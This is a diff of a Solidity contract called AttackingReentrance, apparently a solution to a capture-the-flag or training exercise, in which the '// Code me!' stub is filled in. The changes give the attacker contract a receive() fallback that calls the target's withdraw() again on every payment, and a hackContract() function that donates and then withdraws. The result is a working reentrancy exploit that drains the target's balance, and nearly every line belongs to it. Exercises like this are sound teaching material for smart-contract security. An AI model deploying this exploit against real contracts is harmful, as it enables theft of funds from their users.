@@ -10,18 +10,11 @@ contract AttackingReentrance {
     }
 
     receive() external payable {
-        uint remainingBalance = address(contractAddress).balance;
-        if(remainingBalance > 0) {
-            Reentrance(contractAddress).withdraw();
-        }
+        Reentrance(contractAddress).withdraw();
     }
 
     function hackContract() external {
-        // Code me!
         Reentrance(contractAddress).donate{value: address(this).balance}(address(this));
-        uint remainingBalance = address(contractAddress).balance;
-        if(remainingBalance > 0) {
-            Reentrance(contractAddress).withdraw();
-        }
+        Reentrance(contractAddress).withdraw();        
     }
 }
